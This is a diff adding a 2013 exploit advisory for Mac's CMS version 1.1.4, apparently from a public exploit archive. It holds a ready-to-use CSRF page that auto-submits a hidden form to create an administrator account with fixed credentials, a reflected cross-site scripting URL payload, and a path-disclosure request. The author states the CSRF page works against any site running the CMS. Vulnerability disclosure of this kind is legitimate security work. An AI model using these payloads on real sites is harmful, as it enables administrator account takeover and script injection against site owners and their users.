@@ -1,0 +1,50 @@
+###################################################################################################################################
+# Exploit Title: Mac's CMS - Multiple vilnerabilities
+# Date: 2013 14 August
+# Exploit Author: Yashar shahinzadeh
+# Special thanks to Mormoroth
+# Credit goes for: http://y-shahinzadeh.ir & ha.cker.ir
+# Vendor Homepage: http://macs-framework.sourceforge.net/
+# Tested on: Linux & Windows, PHP 5.3.4
+# Affected Version :  1.1.4
+#
+# Contacts: { http://Twitter.com/YShahinzadeh , http://y-shahinzadeh.ir , http://Twitter.com/Mormoroth , http://mormoroth.ir }
+###################################################################################################################################
+
+Summary:
+========
+1. CSRF - Adding/Editing administrator account
+2. Cross site scripting
+3. Local path disclosure
+
+1. CSRF - Adding/Editing administrator account:
+===============================================
+Following exploits can be used against any site installed "Mac's CMS", after a successful attack a text containing "User: yashar was added successfully. Click Here to update your view" will be appeared. I only illustrate the adding user, editing is similar.
+
+<html>
+<body onload="submitForm()">
+<form name="myForm" id="myForm"
+                action="http://server/index.php/main/cms/saveUser" method="post">
+                <input type="hidden" name="ajaxRequest" value="true">
+                <input type="hidden" name="username" value="yashar">
+                <input type="hidden" name="password" value="yashar">
+				<input type="hidden" name="confirmPassword" value="yashar">
+				<input type="hidden" name="emailAddress" value="y.shahinzadeh@gmail.com">
+				<input type="hidden" name="roleId" value="1">
+</form>
+<script type='text/javascript'>document.myForm.submit();</script>
+</html>
+
+2. Cross site scripting:
+========================
+There are too many XSS (Reflected and stored) in this CMS, I will provide an live example:
+http://server/libs/standalone/whois/example.php/%22%3E%3Cscript%3Ealert%28%27123%27%29%3C/script%3E
+
+3. Local path disclosure:
+=========================
+There are some pages that are big leads to knowing local path, the path is valuable and can be used in Injection and... I would give an instance only:
+
+http://server/index.php/main/cms/getComments/?controller=main&function=index&pageIndex[$test]=1&paginationKey=comments
+
+
+/** Yasshar shahinzadeh **/
